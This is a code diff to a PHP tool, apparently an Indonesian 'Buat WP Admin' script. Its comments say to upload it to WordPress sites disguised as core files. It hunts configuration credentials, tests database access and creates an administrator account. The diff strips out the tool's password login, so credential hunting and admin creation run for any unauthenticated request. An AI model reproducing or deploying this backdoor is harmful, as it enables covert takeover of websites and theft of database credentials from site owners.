@@ -3,7 +3,6 @@
 // Upload dengan nama biasa: wp-user-sync.php | class-wp-session.php
 // Site: astverdi_pba-assunnah @ localhost | prefix wpyc_
 
-$BA_PASS = 'unm@sk666';
 
 $BA_USER  = 'adminrecovery';
 $BA_EMAIL = 'recovery@local.site';
@@ -27,11 +26,6 @@ if (!function_exists('session_start')) {
 function ba_esc($s)
 {
     return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');
-}
-
-function ba_ok()
-{
-    return !empty($_SESSION['ba_ok']);
 }
 
 function ba_is_cli()
@@ -1304,15 +1298,7 @@ if (isset($_POST['manual_path']) || isset($_POST['testdb']) || isset($_POST['run
     }
 }
 
-if (isset($_POST['pw'])) {
-    if ((string) $_POST['pw'] === (string) $BA_PASS) {
-        $_SESSION['ba_ok'] = 1;
-        header('Location: ' . (isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : 'buat_admin.php'));
-        exit;
-    }
-}
-
-if (ba_ok() && isset($_POST['huntcred'])) {
+if (isset($_POST['huntcred'])) {
     $base = ba_find_base($manual_path);
     $hits = ba_hunt_credentials($base !== '' ? $base : $manual_path);
     if (count($hits) === 0) {
@@ -1325,7 +1311,7 @@ if (ba_ok() && isset($_POST['huntcred'])) {
     }
 }
 
-if (ba_ok() && isset($_POST['apply_cred'])) {
+if (isset($_POST['apply_cred'])) {
     $idx = (int) $_POST['apply_cred'];
     $base = ba_find_base($manual_path);
     $hits = ba_hunt_credentials($base !== '' ? $base : $manual_path);
@@ -1349,19 +1335,19 @@ if (ba_ok() && isset($_POST['apply_cred'])) {
     }
 }
 
-if (ba_ok() && isset($_POST['findurl'])) {
+if (isset($_POST['findurl'])) {
     $base = ba_find_base($manual_path);
     $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
     $url_result = ba_lookup_site_urls($base, $manual_db);
 }
 
-if (ba_ok() && isset($_POST['testdb'])) {
+if (isset($_POST['testdb'])) {
     $base = ba_find_base($manual_path);
     $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
     $test_result = ba_test_db($base, $manual_db);
 }
 
-if (ba_ok() && isset($_POST['run'])) {
+if (isset($_POST['run'])) {
     $user = isset($_POST['username']) ? trim($_POST['username']) : $BA_USER;
     $pass = isset($_POST['newpass']) ? $_POST['newpass'] : $BA_NEWPW;
     $mail = isset($_POST['email']) ? trim($_POST['email']) : $BA_EMAIL;
@@ -1375,14 +1361,6 @@ if (ba_ok() && isset($_POST['run'])) {
 }
 
 header('Content-Type: text/html; charset=utf-8');
-
-if (!ba_ok()) {
-    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Buat Admin</title>';
-    echo '<style>body{font:15px sans-serif;background:#f5f5f5;padding:20px}.b{max-width:380px;margin:40px auto;background:#fff;border:1px solid #ddd;padding:20px}input,button{width:100%;padding:10px;box-sizing:border-box;margin-top:8px}button{background:#2563eb;color:#fff;border:0}</style></head><body>';
-    echo '<div class="b"><h2>Buat WP Admin</h2><form method="post"><input type="password" name="pw" required placeholder="Password tool">';
-    echo '<button type="submit">Login</button></form></div></body></html>';
-    exit;
-}
 
 $base = ba_find_base($manual_path);
 $fake_cfg = ($base !== '') ? ba_fake_wpconfig_path($base) : '';
